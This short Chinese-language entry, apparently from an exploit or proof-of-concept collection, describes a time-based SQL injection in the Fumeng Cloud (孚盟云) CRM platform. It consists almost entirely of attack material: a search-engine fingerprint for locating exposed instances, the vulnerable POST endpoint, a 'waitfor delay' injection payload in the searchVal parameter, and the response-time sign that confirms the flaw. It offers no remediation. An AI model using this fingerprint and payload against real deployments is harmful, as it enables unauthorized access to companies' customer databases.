# 浮盟云AjaxOthers存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/AjaxOthers.ashx HTTP/1.1`

**Payload**
```
action=GetCheckRepeatData&searchVal='waitfor delay'0:0:5'--&type=customer
```
- **响应特征**：200 响应时间>=5s